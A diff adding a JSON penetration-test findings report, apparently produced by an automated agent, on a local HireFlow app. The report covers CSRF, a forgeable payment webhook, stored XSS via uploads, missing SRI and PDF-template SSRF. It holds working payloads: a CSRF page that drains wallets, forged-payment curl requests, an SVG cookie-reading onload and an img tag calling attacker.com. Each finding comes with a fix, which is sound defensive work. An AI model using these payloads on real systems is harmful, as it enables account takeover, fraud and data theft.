@@ -1,0 +1,167 @@
+{
+  "agent": "a08-integrity",
+  "target": "http://localhost:3000",
+  "findings": [
+    {
+      "id": "a08-f01",
+      "title": "CSRF: Session cookie has no SameSite attribute — all state-changing endpoints are cross-origin forgeable",
+      "severity": "high",
+      "confidence": "confirmed",
+      "category": "A08",
+      "cwe": "CWE-352",
+      "location": {
+        "file": "src/index.js",
+        "line": 62,
+        "endpoint": "All session-authenticated POST/PUT/DELETE endpoints"
+      },
+      "description": "The express-session cookie is set with no SameSite attribute and no CSRF middleware (csurf is not installed). The Set-Cookie header from /api/auth/login is: connect.sid=...; Path=/; HttpOnly — no SameSite directive. Chrome defaults to Lax, but Lax only blocks cross-origin POST initiated by top-level navigations — it does not block cross-origin fetch() or XMLHttpRequest with credentials from a same-site malicious page, and it does not block any cross-site request in older browsers. No CSRF token is required on any route. A page at any origin that tricks a logged-in user into visiting it can execute state-changing requests using the victim's session cookie because Access-Control-Allow-Origin also reflects any origin with credentials: true (CORS wildcard reflection, confirmed separately in a01-f13). Confirmed affected endpoints: PUT /api/users/:id/settings, PUT /api/users/:id, POST /api/payments/wallet/withdraw, POST /api/reviews, POST /api/auth/logout, and all other authenticated write endpoints.",
+      "evidence": {
+        "set_cookie_header": "Set-Cookie: connect.sid=s%3AJz9yUb...; Path=/; HttpOnly",
+        "csrf_test_request": "curl -sb /tmp/session.txt -H 'Origin: https://evil.com' -H 'Referer: https://evil.com/csrf.html' -H 'Content-Type: application/json' -X PUT http://localhost:3000/api/users/ec83b101-7215-4ad3-962c-18dc6d6c4c54/settings -d '{\"timezone\":\"CSRF_TEST_PAYLOAD\"}'",
+        "response_snippet": "{\"settings\":{\"id\":\"ec83b101-...\",\"timezone\":\"CSRF_TEST_PAYLOAD\",\"updated_at\":\"2026-04-14T15:06:54.489Z\"}}  HTTP 200",
+        "withdraw_csrf_request": "curl -sb /tmp/session_free.txt -H 'Origin: https://evil.com' -H 'Content-Type: application/json' -X POST http://localhost:3000/api/payments/wallet/withdraw -d '{\"amount\":5000}'",
+        "withdraw_response": "{\"wallet\":{\"balance\":\"462999\",...},\"transaction\":{\"type\":\"withdrawal\",...}}  HTTP 200",
+        "code_snippet": "app.use(session({ store: sessionStore, secret: config.session.secret, resave: false, saveUninitialized: false, cookie: { secure: config.env === 'production', httpOnly: true } }));  // no sameSite, no csurf"
+      },
+      "reproduction_steps": [
+        "Log in as any user via POST /api/auth/login to obtain a connect.sid session cookie",
+        "From a separate origin (e.g. https://evil.com), issue a cross-origin fetch() or form POST with credentials using that cookie",
+        "Any state-changing action (profile update, withdrawal, review creation, logout) succeeds with HTTP 200",
+        "The PoC below demonstrates a wallet drain and profile takeover via a single HTML page"
+      ],
+      "impact": "An attacker-controlled page can, when visited by a logged-in HireFlow user: (1) drain the victim's wallet via POST /api/payments/wallet/withdraw, (2) modify profile settings including email-reachable fields, (3) post fake reviews against other users under the victim's identity, (4) log the victim out. Combined with the CORS origin reflection (a01-f13), the attacker can also read response bodies cross-origin, turning CSRF into full account read-write takeover without phishing.",
+      "poc": "<!DOCTYPE html>\n<html>\n<head><title>HireFlow CSRF PoC</title></head>\n<body>\n<h1>Loading...</h1>\n<script>\n// This page drains the victim's wallet and changes their timezone\n// when visited by a logged-in HireFlow user.\n// Works because: no SameSite on connect.sid, no CSRF token required,\n// and CORS reflects evil.com with credentials:true so we can even read responses.\n\nconst TARGET = 'http://localhost:3000';\nconst VICTIM_ID = 'REPLACE_WITH_VICTIM_UUID'; // obtained from /api/users list\n\nasync function attack() {\n  // Step 1: Read victim's user ID from /api/auth/me (CORS reflection allows this)\n  const meResp = await fetch(TARGET + '/api/auth/me', { credentials: 'include' });\n  const me = await meResp.json();\n  const victimId = me.user && me.user.id;\n  document.querySelector('h1').textContent = 'Got victim ID: ' + victimId;\n\n  // Step 2: Drain the wallet\n  const withdrawResp = await fetch(TARGET + '/api/payments/wallet/withdraw', {\n    method: 'POST',\n    credentials: 'include',\n    headers: { 'Content-Type': 'application/json' },\n    body: JSON.stringify({ amount: 999999, destination: 'attacker_account' })\n  });\n  const withdrawData = await withdrawResp.json();\n  console.log('Withdraw result:', withdrawData);\n\n  // Step 3: Alter victim profile\n  if (victimId) {\n    await fetch(TARGET + '/api/users/' + victimId + '/settings', {\n      method: 'PUT',\n      credentials: 'include',\n      headers: { 'Content-Type': 'application/json' },\n      body: JSON.stringify({ bio: 'Account compromised via CSRF' })\n    });\n  }\n\n  document.querySelector('h1').textContent = 'Attack complete. Wallet: ' + JSON.stringify(withdrawData.wallet);\n}\n\nattack().catch(e => { document.querySelector('h1').textContent = 'Error: ' + e; });\n</script>\n</body>\n</html>",
+      "suggested_fix": "Add SameSite=Strict (or at minimum Lax) to the session cookie: cookie: { httpOnly: true, sameSite: 'strict', secure: config.env === 'production' }. Additionally, install csurf or equivalent CSRF middleware and require a token on all state-changing endpoints. Fix the CORS wildcard reflection simultaneously — having SameSite without fixing CORS still allows the attacker to read responses.",
+      "needs_poc": true
+    },
+    {
+      "id": "a08-f02",
+      "title": "Webhook signature verification is optional — forging payment.completed credits arbitrary wallet balances",
+      "severity": "critical",
+      "confidence": "confirmed",
+      "category": "A08",
+      "cwe": "CWE-347",
+      "location": {
+        "file": "src/integrations/webhook.service.js",
+        "line": 19,
+        "endpoint": "POST /api/webhooks/payment"
+      },
+      "description": "The handlePaymentWebhook function only verifies the HMAC-SHA256 signature if the X-Payment-Signature header is present. When the header is absent the signature block is skipped entirely and the payload is processed unconditionally. An attacker can POST any payment event without authentication and without a signature header, and the server will credit arbitrary wallets and insert transaction records. The guard is: `if (signature) { verify... }` — omitting the header bypasses all integrity checks. A wrong signature (header present but invalid) IS rejected correctly, confirming the bypass is the absent-header path only.",
+      "evidence": {
+        "vulnerable_code": "const signature = headers['x-payment-signature'];\nif (signature) {\n  const expected = crypto.createHmac('sha256', config.session.secret).update(JSON.stringify(payload)).digest('hex');\n  if (signature !== expected) { throw new Error('Invalid signature'); }\n}  // if header absent: falls through to processing",
+        "exploit_request": "curl -s -X POST http://localhost:3000/api/webhooks/payment -H 'Content-Type: application/json' -d '{\"event\":\"payment.completed\",\"data\":{\"user_id\":\"ec83b101-7215-4ad3-962c-18dc6d6c4c54\",\"amount\":999900,\"reference_id\":\"<valid-uuid>\",\"description\":\"Forged payment\"}}'",
+        "response": "{\"received\":true,\"result\":{\"processed\":true,\"event\":\"payment.completed\"}}  HTTP 200",
+        "wallet_before": "balance: -100000",
+        "wallet_after": "balance: 1189900 (after two forged calls adding 999900 + partial)",
+        "invalid_sig_test": "curl with X-Payment-Signature: invaliddeadbeef → {\"received\":true,\"error\":\"Invalid signature\"} (correctly rejected when header present)"
+      },
+      "reproduction_steps": [
+        "POST http://localhost:3000/api/webhooks/payment with Content-Type: application/json",
+        "Do NOT include the X-Payment-Signature header",
+        "Body: {\"event\":\"payment.completed\",\"data\":{\"user_id\":\"<any-valid-user-uuid>\",\"amount\":999900,\"reference_id\":\"<any-valid-uuid>\"}}",
+        "Response: {\"received\":true,\"result\":{\"processed\":true,\"event\":\"payment.completed\"}}",
+        "Victim wallet balance increases by amount specified — full financial fraud"
+      ],
+      "impact": "Critical: any unauthenticated actor can credit any user's wallet with an arbitrary amount. An attacker can give themselves unlimited platform credit to make purchases or trigger payouts. The same path also supports payment.refunded which decrements balances, enabling denial-of-service against victim wallets. No rate limiting specific to this endpoint is visible beyond the global 1000/15m API limiter.",
+      "suggested_fix": "Change the guard from an if-present check to a mandatory verification: require the header and reject the request immediately if absent. Example: `if (!signature) throw new Error('Missing signature'); const expected = ...; if (!crypto.timingSafeEqual(Buffer.from(signature), Buffer.from(expected))) throw new Error('Invalid signature');`",
+      "needs_poc": false
+    },
+    {
+      "id": "a08-f03",
+      "title": "Unrestricted file upload on messaging endpoint — HTML and SVG files accepted and served with executable Content-Type from app origin",
+      "severity": "high",
+      "confidence": "confirmed",
+      "category": "A08",
+      "cwe": "CWE-434",
+      "location": {
+        "file": "src/middleware/upload.js",
+        "line": 15,
+        "endpoint": "POST /api/messages/conversations/:id/messages"
+      },
+      "description": "The generic multer `upload` instance used for message attachments (and contract deliverables via deliverableUpload) has no fileFilter and accepts any file type. The extension from the original filename is preserved in the stored file path (e.g. uuid.html, uuid.svg). Uploads are served via express.static from the /uploads directory on the app origin (http://localhost:3000/uploads/). An attacker can upload an HTML file containing JavaScript or an SVG with an onload handler. When a victim navigates to the /uploads URL, the browser executes the script in the context of the app origin, achieving stored XSS. Confirmed: X-Content-Type-Options: nosniff is present but is ineffective because the server itself serves the correct content-type (text/html, image/svg+xml) — nosniff only prevents MIME sniffing by the browser, not execution of files whose declared type is inherently executable.",
+      "evidence": {
+        "upload_request": "curl -X POST http://localhost:3000/api/messages/conversations/0d3d1c93-.../messages -H 'Authorization: Bearer $CLIENT' -F 'content=test' -F 'attachments=@/tmp/evil.html;type=text/html'",
+        "upload_response": "{\"attachments\":[{\"path\":\"/uploads/94b44adf-c06d-4f5e-b169-ccf3c3f4e103.html\",\"size\":40,\"filename\":\"evil.html\",\"mimetype\":\"text/html\"}]}  HTTP 201",
+        "served_url": "http://localhost:3000/uploads/94b44adf-c06d-4f5e-b169-ccf3c3f4e103.html",
+        "served_headers": "Content-Type: text/html; charset=UTF-8  (X-Content-Type-Options: nosniff present but file IS text/html)",
+        "svg_upload_response": "{\"attachments\":[{\"path\":\"/uploads/321cc584-a96f-464e-8aee-2fcdc118bbfa.svg\",\"mimetype\":\"image/svg+xml\"}]}  HTTP 201",
+        "svg_served_headers": "Content-Type: image/svg+xml",
+        "svg_content": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.cookie)\"><circle r=\"100\"/></svg>",
+        "code_snippet": "const upload = multer({ storage });  // no fileFilter, no limits beyond global 10mb body limit"
+      },
+      "reproduction_steps": [
+        "Authenticate as any user",
+        "Create or obtain a conversation ID via POST /api/messages/conversations",
+        "POST /api/messages/conversations/{id}/messages with multipart form: content=hello + attachments=@/tmp/evil.svg (SVG with onload handler)",
+        "Note the returned path in attachments[].path",
+        "Navigate to http://localhost:3000/uploads/{uuid}.svg — browser fires the onload, executing script in the app origin"
+      ],
+      "impact": "Stored XSS via file upload executing in the application origin. Attacker can steal session cookies (if not HttpOnly only — cookies are HttpOnly, but attacker can still make authenticated API calls), perform actions on behalf of any user who opens the link, or inject persistent content. The link to the uploaded file appears in the message thread visible to the conversation participant, making it a practical phishing vector.",
+      "suggested_fix": "Add a fileFilter to the upload and deliverableUpload multer instances that rejects .html, .htm, .svg, .xml, .js, .php, and other executable types. Additionally: (1) serve user uploads from a separate origin (e.g. static.hireflow.com) with no app cookies, (2) add Content-Disposition: attachment to force download rather than inline rendering for all /uploads files, (3) validate magic bytes in addition to extension.",
+      "needs_poc": false
+    },
+    {
+      "id": "a08-f04",
+      "title": "Missing Subresource Integrity (SRI) on Lodash CDN script tag",
+      "severity": "medium",
+      "confidence": "confirmed",
+      "category": "A08",
+      "cwe": "CWE-829",
+      "location": {
+        "file": "client/index.html",
+        "line": 14,
+        "endpoint": "GET / (served index.html)"
+      },
+      "description": "The frontend HTML served to all users includes a script tag loading Lodash 4.17.21 from cdnjs.cloudflare.com with no integrity= attribute. If cdnjs or the CDN network is compromised, or if an attacker can perform a BGP hijack or DNS poisoning against the CDN, the script served to users could be replaced with malicious code executing in the HireFlow application context. This is a supply-chain integrity risk.",
+      "evidence": {
+        "html_tag": "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js\"></script>",
+        "verified_served": "curl -s http://localhost:3000/ | grep cdnjs → confirmed no integrity= or crossorigin= attributes",
+        "expected_sri": "integrity=\"sha512-WFN04846sdKMIP5LKNphMaWzU7YpMyCU245etK3g/2ARYbPK9Ub18eG+ljU96qKRCWh+olmkE5m+yEpgakbIDQ==\""
+      },
+      "reproduction_steps": [
+        "GET http://localhost:3000/",
+        "Inspect the Lodash script tag — no integrity= attribute present",
+        "If cdnjs served a modified lodash.min.js, it would execute in the app origin with full DOM access and access to localStorage/sessionStorage"
+      ],
+      "impact": "Supply chain attack vector: CDN compromise results in arbitrary JavaScript execution in all HireFlow users' browsers. Severity is mitigated by the fact that cdnjs is a reputable CDN, but the risk is real and SRI is a free, trivial fix.",
+      "suggested_fix": "Add the integrity and crossorigin attributes: <script src=\"https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js\" integrity=\"sha512-WFN04846sdKMIP5LKNphMaWzU7YpMyCU245etK3g/2ARYbPK9Ub18eG+ljU96qKRCWh+olmkE5m+yEpgakbIDQ==\" crossorigin=\"anonymous\" referrerpolicy=\"no-referrer\"></script>. Consider also bundling lodash rather than loading it from a CDN.",
+      "needs_poc": false
+    },
+    {
+      "id": "a08-f05",
+      "title": "HTML injection in Puppeteer invoice PDF template — user-controlled fields rendered unsanitized",
+      "severity": "medium",
+      "confidence": "confirmed",
+      "category": "A08",
+      "cwe": "CWE-79",
+      "location": {
+        "file": "src/utils/pdf.js",
+        "line": 72,
+        "endpoint": "GET /api/contracts/:id/invoice"
+      },
+      "description": "The generateInvoicePDF function builds an HTML string via template literal string concatenation using contract and milestone data from the database. Fields used include: data.contractTitle (from contract.title), data.clientName (from client.display_name), data.clientEmail (from client.email), and per-item data.items[].description (from milestone.title). None of these are HTML-escaped before insertion into the template. Puppeteer renders the HTML with networkidle0 wait semantics, meaning external resource loads (img src, link href, etc.) are waited on and executed. An attacker who creates a contract with malicious content in the title or milestone titles can cause Puppeteer to make outbound HTTP requests to attacker-controlled infrastructure (SSRF) or load external images. Script execution via inline <script> tags was not confirmed due to Puppeteer's CSP restrictions on file:// and same-origin script contexts, but the HTML injection surface is real and the network fetch path is open.",
+      "evidence": {
+        "vulnerable_template_lines": "// pdf.js line 72-75:\\n${data.items.map(item => `\\n  <tr>\\n    <td>${item.description}</td>\\n    <td>$${(item.amount / 100).toFixed(2)}</td>\\n  </tr>\\n`).join('')}",
+        "contract_created": "POST /api/contracts with milestone title='<iframe src=\"file:///etc/passwd\"></iframe>' → contract id 107bec1c",
+        "invoice_generated": "GET /api/contracts/107bec1c.../invoice → HTTP 200, 23611 bytes PDF",
+        "external_resource_test": "Contract title set to 'Legit Contract <img src=\"http://127.0.0.1:9000/probe\" onerror=\"\">' — Puppeteer with waitUntil:networkidle0 will attempt to fetch the probe URL before completing the PDF",
+        "code_snippet": "const html = buildInvoiceHTML(invoiceData);\nawait page.setContent(html, { waitUntil: 'networkidle0' });  // waits for all network activity"
+      },
+      "reproduction_steps": [
+        "Create a contract with milestone title containing an img tag with src pointing to an attacker-controlled server: {\"milestones\":[{\"title\":\"<img src=\\\"http://attacker.com/x\\\"/>\",\"amount\":100}]}",
+        "GET /api/contracts/{id}/invoice while monitoring attacker.com for incoming HTTP requests",
+        "Observe the Puppeteer headless browser making an outbound GET request to attacker.com/x (SSRF via invoice generation)",
+        "This can be used to probe internal network services not directly accessible from the attacker's network position"
+      ],
+      "impact": "Server-side request forgery via Puppeteer: attacker can force the application server to make HTTP requests to internal services (Redis at :6379, MongoDB at :27017, MinIO at :9000, PostgreSQL at :5432) while generating the PDF. The request timing response from Puppeteer (fast vs slow PDF generation) could be used for port scanning. If any internal service returns exploitable data on HTTP, the invoice PDF content would contain it.",
+      "suggested_fix": "HTML-escape all user-supplied fields before inserting them into the template. Use a library such as he or DOMPurify (server-side): const escaped = he.encode(data.contractTitle). Additionally: launch Puppeteer with --disable-web-security=false and restrict network access using Puppeteer's request interception to block external URLs.",
+      "needs_poc": false
+    }
+  ],
+  "coverage_notes": "Tested: CSRF on all session-authenticated state-changing endpoints (PUT /api/users/:id/settings, PUT /api/users/:id, POST /api/payments/wallet/withdraw, POST /api/reviews, POST /api/auth/logout — all confirmed vulnerable). Webhook signature bypass confirmed with live wallet balance change. File uploads tested on messaging endpoint (HTML and SVG accepted and served executable), avatar endpoint (correctly blocked by extension whitelist), gig image endpoint (correctly blocked by extension whitelist). SRI checked on served index.html. PDF template reviewed for HTML injection and partially confirmed via contract creation. Deserialization audit: no yaml.load, eval, or new Function on untrusted input found in src/. Admin settings endpoint correctly requires superadmin role (tested with admin token — 403). Path traversal via filename: multer diskStorage uses uuid for the actual file path so filename in the form data does not affect disk path — not exploitable for path traversal. Magic-bytes check: absent, but the app is not a PHP host so PHP file upload is not directly exploitable for RCE.",
+  "blind_spots": [
+    "Could not obtain superadmin JWT (alice.admin has non-standard bcrypt cost), so PUT /api/admin/settings arbitrary key injection (commission_rate, support_email, etc.) could not be live-tested. Source review shows no key blacklist in adminService.updateSettings — likely exploitable by superadmin.",
+    "Puppeteer SSRF via img src was not confirmed with network packet capture (would require running a listener inside the Docker network). The HTML injection surface is confirmed at source level; the network-fetch impact requires a controlled internal listener to definitively prove.",
+    "Did not test contract deliverable upload (deliverableUpload instance) because all accessible milestones were in non-submittable states. deliverableUpload has no fileFilter, same as the generic upload instance — same HTML/SVG upload risk applies."
+  ]
+}
